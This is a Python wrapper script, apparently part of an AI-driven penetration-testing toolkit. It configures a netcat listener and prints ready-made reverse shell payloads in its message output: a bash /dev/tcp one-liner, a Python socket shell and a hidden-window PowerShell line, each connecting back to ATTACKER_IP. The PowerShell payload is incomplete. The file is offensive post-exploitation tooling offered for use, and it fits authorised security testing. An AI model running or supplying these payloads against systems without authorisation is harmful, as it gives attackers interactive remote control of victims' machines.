#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
netcat wrapper - MCP Code API Pattern (VPS Docker deployment)
Executes netcat listener, saves raw output, returns parsed summary
"""

import sys
import io
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

# Add parent directory to path for utils
sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.vps_utils import docker_exec

# Force UTF-8 encoding for Windows console output
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')


def netcat_listener(port: str = "4444", options: str = "-lvnp", engagement_dir: Optional[str] = None) -> Dict:
    """
    Start netcat listener for reverse shells.

    Args:
        port: Port to listen on (default: 4444)
        options: Netcat options (default: -lvnp)
        engagement_dir: Optional engagement directory path

    Returns:
        Dict with:
        - summary: Listener status and connection info
        - outputFile: Path to raw netcat output (if connection received)
        - message: Human-readable summary
    """

    # Generate output filename
    timestamp = datetime.now().strftime("%Y-%m-%dT%H-%M-%S")
    filename = f"netcat-{port}-{timestamp}.txt"

    # Determine output directory
    if engagement_dir:
        output_dir = Path(engagement_dir) / "05-post-exploitation" / "netcat"
    else:
        session_date = datetime.now().strftime("%Y-%m-%d")
        output_dir = Path.home() / ".claude" / "sessions" / session_date / "scans" / "netcat"

    output_dir.mkdir(parents=True, exist_ok=True)
    output_file = output_dir / filename

    # Build netcat command
    cmd = f"nc {options} {port}"

    # Return listener setup info (netcat is interactive, can't capture in wrapper pattern)
    message = f"[+] Netcat listener configuration\n"
    message += f"    Port: {port}\n"
    message += f"    Command: {cmd}\n"
    message += f"    Output will be saved to: {output_file}\n"
    message += f"\n"
    message += f"    Note: Netcat listener is interactive and must be run manually:\n"
    message += f"    Run: {cmd} | tee {output_file}\n"
    message += f"\n"
    message += f"    Reverse shell payloads:\n"
    message += f"    Bash:   bash -i >& /dev/tcp/ATTACKER_IP/{port} 0>&1\n"
    message += f"    Python: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"
    message += f"    PowerShell: powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",{port});\n"

    return {
        "summary": {
            "listenerPort": port,
            "command": cmd,
            "outputFile": str(output_file),
            "status": "ready"
        },
        "outputFile": str(output_file),
        "message": message
    }


if __name__ == "__main__":
    if len(sys.argv) < 1:
        print("Usage: python netcat.py [port] [options] [engagement_dir]")
        print("Example: python netcat.py 4444")
        print("Example: python netcat.py 8080 '-lvnp'")
        sys.exit(1)

    port = sys.argv[1] if len(sys.argv) > 1 else "4444"
    options = sys.argv[2] if len(sys.argv) > 2 else "-lvnp"
    engagement_dir = sys.argv[3] if len(sys.argv) > 3 else None

    result = netcat_listener(port, options, engagement_dir)
    print(result["message"])
